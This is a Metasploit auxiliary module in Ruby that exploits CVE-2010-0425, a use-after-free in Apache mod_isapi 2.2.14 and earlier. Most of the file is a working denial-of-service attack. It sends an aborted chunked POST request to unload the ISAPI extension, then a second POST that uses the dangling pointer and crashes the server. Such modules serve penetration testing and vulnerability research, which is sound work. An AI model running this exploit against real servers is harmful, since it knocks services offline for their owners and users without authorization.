##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Apache mod_isapi Dangling Pointer',
        'Description' => %q{
          This module triggers a use-after-free vulnerability in the Apache
          Software Foundation mod_isapi extension for versions 2.2.14 and earlier.
          In order to reach the vulnerable code, the target server must have an
          ISAPI module installed and configured.

          By making a request that terminates abnormally (either an aborted TCP
          connection or an unsatisfied chunked request), mod_isapi will unload the
          ISAPI extension. Later, if another request comes for that ISAPI module,
          previously obtained pointers will be used resulting in an access
          violation or potentially arbitrary code execution.

          Although arbitrary code execution is theoretically possible, a
          real-world method of invoking this consequence has not been proven. In
          order to do so, one would need to find a situation where a particular
          ISAPI module loads at an image base address that can be re-allocated by
          a remote attacker.

          Limited success was encountered using two separate ISAPI modules. In
          this scenario, a second ISAPI module was loaded into the same memory
          area as the previously unloaded module.
        },
        'Author' => [
          'Brett Gervasoni', # original discovery
          'jduck'
        ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'CVE', '2010-0425' ],
          [ 'OSVDB', '62674'],
          [ 'BID', '38494' ],
          [ 'URL', 'https://bz.apache.org/bugzilla/show_bug.cgi?id=48509' ],
          [ 'URL', 'https://web.archive.org/web/20100715032229/http://www.gossamer-threads.com/lists/apache/cvs/381537' ],
          [ 'URL', 'http://www.senseofsecurity.com.au/advisories/SOS-10-002' ],
          [ 'EDB', '11650' ]
        ],
        'DisclosureDate' => '2010-03-05',
        'Notes' => {
          'Stability' => [CRASH_SERVICE_DOWN],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )

    register_options([
      Opt::RPORT(80),
      OptString.new('ISAPI', [ true, 'ISAPI URI to request', '/cgi-bin/SMTPSend.dll' ])
    ])
  end

  def run
    server_ip = datastore['RHOST']
    if (datastore['RPORT'].to_i != 80)
      server_ip += ':' + datastore['RPORT'].to_s
    end
    isapi_uri = datastore['ISAPI']

    # Create a stale pointer using the vulnerability
    print_status('Causing the ISAPI dll to be loaded and unloaded...')
    unload_trigger = 'POST ' + isapi_uri + " HTTP/1.0\r\n" \
                     "Pragma: no-cache\r\n" \
                     "Proxy-Connection: Keep-Alive\r\n" \
                     'Host: ' + server_ip + "\r\n" \
                     "Transfer-Encoding: chunked\r\n" \
                     "Content-Length: 40334\r\n\r\n" +
                     Rex::Text.rand_text_alphanumeric(128..255)
    connect
    sock.put(unload_trigger)
    disconnect

    # Now make the stale pointer get used...
    print_status('Triggering the crash ...')
    data = Rex::Text.rand_text_alphanumeric(1337..1592)
    crash_trigger = 'POST ' + isapi_uri + " HTTP/1.0\r\n" \
                    'Host: ' + server_ip + "\r\n" \
                    "Content-Length: #{data.length}\r\n\r\n" +
                    data

    connect
    sock.put(crash_trigger)
    disconnect
  end
end
